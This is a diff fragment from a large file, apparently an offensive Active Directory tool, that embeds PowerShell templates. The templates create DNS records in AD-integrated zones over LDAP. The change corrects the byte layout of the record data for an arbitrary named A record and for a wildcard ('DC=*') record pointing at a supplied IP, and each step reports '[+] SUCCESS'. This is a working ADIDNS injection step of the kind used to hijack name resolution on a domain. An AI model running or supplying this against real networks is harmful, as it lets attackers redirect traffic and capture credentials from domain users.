@@ -18877,22 +18877,24 @@ if ($existing.Name) {
 try {
   $zoneObj = [ADSI]"LDAP://$zoneDN"
   $record = $zoneObj.Create("dnsNode", "DC=${name}")
-  # Build DNS record binary data for A record
+  # Build DNS_RPC_RECORD binary (MS-DNSP 2.2.2.2.5)
+  # Structure: DataLength(2) Type(2) Version(1) Rank(1) Flags(2) Serial(4) TtlSeconds(4) Reserved(4) TimeStamp(4) Data(variable)
   $ipParts = '${ip}'.Split('.')
-  $recordData = [byte[]]@(
-    0x04, 0x00,       # DataLength = 4
-    0x01, 0x00,       # Type = A (0x0001)
-    0x05, 0x00, 0x00, 0x00,  # Version = 5
-    0x00, 0x00, 0x00, 0x00,  # Rank = 0
-    0x00, 0x00,       # Flags
-    0x00, 0x00, 0x00, 0x00,  # Serial
-    0x00, 0x00, 0x00, 0x00,  # TtlSeconds = 900
-    0x84, 0x03, 0x00, 0x00,  # 900 in LE
-    0x00, 0x00, 0x00, 0x00,  # Reserved
-    0x00, 0x00, 0x00, 0x00,  # Timestamp
-    [byte]$ipParts[0], [byte]$ipParts[1], [byte]$ipParts[2], [byte]$ipParts[3]
-  )
-  $record.Put("dnsRecord", $recordData)
+  $recordData = New-Object System.Collections.Generic.List[byte]
+  $recordData.AddRange([System.BitConverter]::GetBytes([uint16]4))    # DataLength = 4 (A record = 4 bytes)
+  $recordData.AddRange([System.BitConverter]::GetBytes([uint16]1))    # Type = A (1)
+  $recordData.Add(0x05)                                               # Version = 5
+  $recordData.Add(0xF0)                                               # Rank = RANK_ZONE (0xF0)
+  $recordData.AddRange([System.BitConverter]::GetBytes([uint16]0))    # Flags = 0
+  $recordData.AddRange([System.BitConverter]::GetBytes([uint32]0))    # Serial = 0 (auto)
+  $recordData.AddRange([System.BitConverter]::GetBytes([uint32]900))  # TTL = 900 seconds
+  $recordData.AddRange([System.BitConverter]::GetBytes([uint32]0))    # Reserved
+  $recordData.AddRange([System.BitConverter]::GetBytes([uint32]0))    # TimeStamp = 0 (static, no aging)
+  $recordData.Add([byte]$ipParts[0])
+  $recordData.Add([byte]$ipParts[1])
+  $recordData.Add([byte]$ipParts[2])
+  $recordData.Add([byte]$ipParts[3])
+  $record.Put("dnsRecord", $recordData.ToArray())
   $record.Put("dNSTombstoned", $false)
   $record.SetInfo()
   Write-Output "[+] SUCCESS: DNS record created"
@@ -18940,15 +18942,23 @@ $zoneDN = "DC=$primaryZone,CN=MicrosoftDNS,$dnsRoot"
 try {
   $zoneObj = [ADSI]"LDAP://$zoneDN"
   $record = $zoneObj.Create("dnsNode", "DC=*")
+  # Build DNS_RPC_RECORD binary (MS-DNSP 2.2.2.2.5)
   $ipParts = '${ip}'.Split('.')
-  $recordData = [byte[]]@(
-    0x04, 0x00, 0x01, 0x00, 0x05, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x84, 0x03, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    [byte]$ipParts[0], [byte]$ipParts[1], [byte]$ipParts[2], [byte]$ipParts[3]
-  )
-  $record.Put("dnsRecord", $recordData)
+  $recordData = New-Object System.Collections.Generic.List[byte]
+  $recordData.AddRange([System.BitConverter]::GetBytes([uint16]4))    # DataLength = 4
+  $recordData.AddRange([System.BitConverter]::GetBytes([uint16]1))    # Type = A (1)
+  $recordData.Add(0x05)                                               # Version = 5
+  $recordData.Add(0xF0)                                               # Rank = RANK_ZONE (0xF0)
+  $recordData.AddRange([System.BitConverter]::GetBytes([uint16]0))    # Flags = 0
+  $recordData.AddRange([System.BitConverter]::GetBytes([uint32]0))    # Serial = 0 (auto)
+  $recordData.AddRange([System.BitConverter]::GetBytes([uint32]900))  # TTL = 900 seconds
+  $recordData.AddRange([System.BitConverter]::GetBytes([uint32]0))    # Reserved
+  $recordData.AddRange([System.BitConverter]::GetBytes([uint32]0))    # TimeStamp = 0 (static)
+  $recordData.Add([byte]$ipParts[0])
+  $recordData.Add([byte]$ipParts[1])
+  $recordData.Add([byte]$ipParts[2])
+  $recordData.Add([byte]$ipParts[3])
+  $record.Put("dnsRecord", $recordData.ToArray())
   $record.Put("dNSTombstoned", $false)
   $record.SetInfo()
   Write-Output "[+] SUCCESS: Wildcard record created"
